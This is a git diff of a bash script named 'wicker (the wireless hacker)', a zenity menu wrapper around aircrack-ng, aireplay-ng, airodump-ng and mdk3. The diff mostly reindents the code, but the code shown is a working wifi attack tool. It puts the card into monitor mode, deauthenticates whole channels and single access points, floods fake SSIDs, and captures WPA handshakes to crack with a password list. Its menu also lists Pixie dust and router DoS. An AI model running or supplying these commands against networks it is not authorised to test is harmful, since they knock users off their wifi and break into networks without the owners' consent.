@@ -2,6 +2,7 @@
 
 #tool-name: wicker (the wireless hacker)
 #author: akrecH
+#github- https://github.com/akr3ch
 
 #color codes
 B='\e[1m'
@@ -50,62 +51,61 @@ trap "trap_ctrlc" 2
 
 #turn on monitor mode
 on () {
-(echo "10" ; sleep 1
-echo "# 🥷🏼Turning on monitor mode..." ; sleep 1
-sudo xterm -T "☠️wicker☠️" -e "airmon-ng check kill"
-echo "20" ; sleep 1
-
-echo "# 🥷🏼Trying to make ${phy} interface down..." ; sleep 1
-sudo xterm -T "☠️wicker☠️" -e "ip link set ${phy} down"
-echo "50" ; sleep 1
-
-echo "# 🥷🏼Changing the interface name from ${phy} to wlan0mon" ; sleep 1
-sudo xterm -T "☠️wicker☠️" -e "ip link set ${phy} name wlan0mon"
-echo "75" ; sleep 1
-
-echo "# 🥷🏼Changing card mode from managed to monitor..." ; sleep 1
-sudo xterm -T "☠️wicker☠️" -e "iw dev wlan0mon set type monitor"
-echo "100" ; sleep 1
-) | zenity --progress \
---title="☠️wicker☠️" \
---text="🥷🏼Turning on monitor mode..." \
---percentage=0 \
---auto-close --no-cancel --width=400
-
-zenity --info --title="☠️wicker☠️" --text="👽Monitor mode turned on successfully" --width=300
-
-menu
+	(echo "10" ; sleep 1
+	echo "# 🥷🏼Turning on monitor mode..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️" -e "airmon-ng check kill"
+	echo "20" ; sleep 1
+	
+	echo "# 🥷🏼Trying to make ${phy} interface down..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️" -e "ip link set ${phy} down"
+	echo "50" ; sleep 1
+	
+	echo "# 🥷🏼Changing the interface name from ${phy} to wlan0mon" ; sleep 1
+	sudo xterm -T "☠️wicker☠️" -e "ip link set ${phy} name wlan0mon"
+	echo "75" ; sleep 1
+	
+	echo "# 🥷🏼Changing card mode from managed to monitor..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️" -e "iw dev wlan0mon set type monitor"
+	echo "100" ; sleep 1
+	) | zenity --progress \
+	--title="☠️wicker☠️" \
+	--text="🥷🏼Turning on monitor mode..." \
+	--percentage=0 \
+	--auto-close --no-cancel --width=400
+	
+	zenity --info --title="☠️wicker☠️" --text="👽Monitor mode turned on successfully" --width=300
+	
+	menu
 }
 
 
 
 #turn off monitor mode
 off () {
-
-(echo "10" ; sleep 1
-echo "# 🥷🏼Turning off monitor mode..." ; sleep 1
-sudo xterm -T "☠️wicker☠️"  -e "ip link set wlan0mon up"
-echo "20" ; sleep 1
-
-echo "# 🥷🏼Turning interface mode managed from monitor..." ; sleep 1
-sudo xterm -T "☠️wicker☠️"  -e "iw dev wlan0mon set type managed"
-echo "50" ; sleep 1
-
-echo "# 🥷🏼Trying to restart Network manager..." ; sleep 1
-sudo xterm -T "☠️wicker☠️"  -e "service NetworkManager restart"
-echo "75" ; sleep 1
-
-echo "# 🥷🏼Network manager restarted..." ; sleep 1
-echo "100" ; sleep 2
-) | zenity --progress \
---title="☠️wicker☠️" \
---text="🥷🏼Turning off monitor mode..." \
---percentage=0 \
---auto-close --no-cancel --width=400
-
-zenity --info --title="☠️wicker☠️" --text="📡Monitor mode turned off..." --width=300
-
-menu
+	(echo "10" ; sleep 1
+	echo "# 🥷🏼Turning off monitor mode..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️"  -e "ip link set wlan0mon up"
+	echo "20" ; sleep 1
+	
+	echo "# 🥷🏼Turning interface mode managed from monitor..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️"  -e "iw dev wlan0mon set type managed"
+	echo "50" ; sleep 1
+	
+	echo "# 🥷🏼Trying to restart Network manager..." ; sleep 1
+	sudo xterm -T "☠️wicker☠️"  -e "service NetworkManager restart"
+	echo "75" ; sleep 1
+	
+	echo "# 🥷🏼Network manager restarted..." ; sleep 1
+	echo "100" ; sleep 2
+	) | zenity --progress \
+	--title="☠️wicker☠️" \
+	--text="🥷🏼Turning off monitor mode..." \
+	--percentage=0 \
+	--auto-close --no-cancel --width=400
+	
+	zenity --info --title="☠️wicker☠️" --text="📡Monitor mode turned off..." --width=300
+	
+	menu
 }
 
 
@@ -160,7 +160,7 @@ if [ -z $r ];
 then
 	menu
 
-elif [ "$r" == "full" ];
+elif [ "$r" == "full👨‍👨‍👦‍👦" ];
 then
 	reset;
 	sudo airodump-ng wlan0mon
@@ -172,7 +172,7 @@ fi
 }
 
 airodump_run () {
-if [ "$r" == "single" ];
+if [ "$r" == "single🧟‍♂️" ];
 then
 	loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
 	bssid=`zenity --list --title="🛸airodump-ng" --text="Enter BSSID address" --cancel-label="Enter manually" --column="BSSID" $loot --width=500 --height=350`
@@ -276,7 +276,7 @@ fi
 #deauth wifi channel
 mdk () {
 
-channel=$(zenity --entry --title="🕸️Deauth wifi channel" --text="enter channel number" --width=400)
+	channel=$(zenity --entry --title="🕸️Deauth wifi channel" --text="enter channel number" --width=400)
 
 if [ -z $channel ];
 then
@@ -284,9 +284,9 @@ then
 
 
 else
-sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
-echo -e "${B}${y}[!]${r}Press ( Ctrl + C ) to stop${s}"
-sudo mdk3 wlan0mon d -c $channel
+	sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+	echo -e "${B}${y}[!]${r}Press ( Ctrl + C ) to stop${s}"
+	sudo mdk3 wlan0mon d -c $channel
 fi
 }
 
@@ -294,7 +294,7 @@ fi
 
 #create multiple fake ssid
 mdk1 () {
-channel=$(zenity --entry --title="🕵🏻‍♂️Create multiple fake SSID" --text="Enter channel number" --width=300)
+	channel=$(zenity --entry --title="🕵🏻‍♂️Create multiple fake SSID" --text="Enter channel number" --width=300)
 
 if [ -z $channel ];
 then
@@ -302,9 +302,9 @@ then
 	menu
 fi
 
-zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Select a (.txt) file which cotains the SSID names" --width=300
+	zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Select a (.txt) file which cotains the SSID names" --width=300
 
-txt=$(zenity --file-selection)
+	txt=$(zenity --file-selection)
 
 if [ -z $txt ];
 then
@@ -312,10 +312,10 @@ then
 	menu
 fi
 
-zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Multiple SSID created successfully\nPress Ctrl+C to stop" --width=300 &
+	zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Multiple SSID created successfully\nPress Ctrl+C to stop" --width=300 &
 
-sudo xterm -T "Hosting fake Wifi SSID" -e  "cat $txt && mdk3 wlan0mon b -c $channel -f $txt"
-menu
+	sudo xterm -T "Hosting fake Wifi SSID" -e  "cat $txt && mdk3 wlan0mon b -c $channel -f $txt"
+	menu
 
 }
 
@@ -323,9 +323,9 @@ menu
 
 #capture handshake
 handshake () {
-sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+	sudo xterm -T "All local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 
-bssid=`zenity --list --title="🕸️Capture handshake" --cancel-label="Enter manually" --text="select BSSID" --column="BSSID" $loot --width=500 --height=400`
+	bssid=`zenity --list --title="🕸️Capture handshake" --cancel-label="Enter manually" --text="select BSSID" --column="BSSID" $loot --width=500 --height=400`
 
 if [ -z "$bssid" ];
 then
@@ -338,44 +338,41 @@ then
 	menu
 fi
 
-xterm -T "Making a directory for (.cap) files" -e "rm -rf /tmp/WICKER-CAPS && mkdir /tmp/WICKER-CAPS"
+	xterm -T "Making a directory for (.cap) files" -e "rm -rf /tmp/WICKER-CAPS && mkdir /tmp/WICKER-CAPS"
 
 
-(
-echo "# 🥷🏼Saving captured packet in /tmp/WICKER-CAPS..." ; sleep 1
-sudo xterm -T "Trying to capture handshake" -e "airodump-ng --bssid ${bssid} --write '/tmp/WICKER-CAPS/captured-handshake-${bssid}' wlan0mon" &
-sleep 1
+	(echo "# 🥷🏼Saving captured packet in /tmp/WICKER-CAPS..." ; sleep 1
+	sudo xterm -T "Trying to capture handshake" -e "airodump-ng --bssid ${bssid} --write '/tmp/WICKER-CAPS/captured-handshake-${bssid}' wlan0mon" &
+	sleep 1
+	
+	
+	echo "# 🥷🏼Saved cap file as\n captured-handshake-${bssid}-01.cap..." ; sleep 1
+	sudo xterm -T "Trying to deauthenticate users from the wifi" -e "aireplay-ng --deauth 200 -D -a ${bssid} wlan0mon" &
+	
+	sleep 1
+	
+	echo "# 🥷🏼Deauth process started..." ; sleep 1
+	
+	sleep 1
+	
+	echo "# 🥷🏼Trying to capture handshake..." ; sleep 1
 
-
-echo "# 🥷🏼Saved cap file as\n captured-handshake-${bssid}-01.cap..." ; sleep 1
-sudo xterm -T "Trying to deauthenticate users from the wifi" -e "aireplay-ng --deauth 200 -D -a ${bssid} wlan0mon" &
-
-sleep 1
-
-echo "# 🥷🏼Deauth process started..." ; sleep 1
-
-sleep 1
-
-echo "# 🥷🏼Trying to capture handshake..." ; sleep 1
-
-for i in {0..100}
-do
-echo $i ; sleep 1
-done
-
-) | zenity --progress \
---title="☠️wicker☠️" \
---text="🕸️Capture handshake" \
---percentage=0 \
---auto-close --no-cancel --time-remaining --width=300
-
-#find the .cap file
-file=`find /tmp/WICKER-CAPS -name "captured-handshake-*.cap"`
-
-#wicker default passwordlist
-pass=/usr/share/wicker/passwords.txt
-
-#check is there any handshake captued on not
+	for i in {0..100}
+	do
+	echo $i ; sleep 1
+	done) | zenity --progress \
+	--title="☠️wicker☠️" \
+	--text="🕸️Capture handshake" \
+	--percentage=0 \
+	--auto-close --no-cancel --time-remaining --width=300
+	
+	#find the .cap file
+	file=`find /tmp/WICKER-CAPS -name "captured-handshake-*.cap"`
+	
+	#wicker default passwordlist
+	pass=/usr/share/wicker/passwords.txt
+	
+	#check is there any handshake captued on not
 if aircrack-ng $file -w $pass | grep -q "1 handshake"
 then
 	opinion=0
@@ -426,22 +423,22 @@ fi
 
 
 menu () {
-c=$(zenity --list --radiolist --title="☠️Network interface ${phy}️ ☠️" --text="Select an option" --column="Select" --column="Menu Item" \
-FALSE "🕸️Capture handshake" \
-FALSE "✨Pixie dust" \
-FALSE "🔍Run airodump-ng" \
-FALSE "🛰Deauth wifi" \
-FALSE "🚧Deauth channel" \
-FALSE "💤Create multiple fake SSID" \
-FALSE "🐌Router DOS" \
-FALSE "💉Check injection" \
-FALSE "📡Turn off monitor mode" \
-FALSE "👽Turn on monitor mode" --cancel-label="exit" --hide-header --ok-label="ok" --width=500 --height=350 )
+	c=$(zenity --list --radiolist --title="☠️Network interface ${phy}️ ☠️" --text="Select an option" --column="Select" --column="Menu Item" \
+	FALSE "🕸️Capture handshake" \
+	FALSE "✨Pixie dust" \
+	FALSE "🔍Run airodump-ng" \
+	FALSE "🛰Deauth wifi" \
+	FALSE "🚧Deauth channel" \
+	FALSE "💤Create multiple fake SSID" \
+	FALSE "🐢Router DOS" \
+	FALSE "💉Check injection" \
+	FALSE "📡Turn off monitor mode" \
+	FALSE "👽Turn on monitor mode" --cancel-label="exit" --hide-header --ok-label="ok" --width=500 --height=350 )
 
 if [ "$c" == "👽Turn on monitor mode" ];
 then
-	phy=wlan0mon
 	on
+	phy=wlan0mon
 
 
 elif [ "$c" == "📡Turn off monitor mode" ];
@@ -504,4 +501,4 @@ then
 
 fi
 }
-menu
+	menu
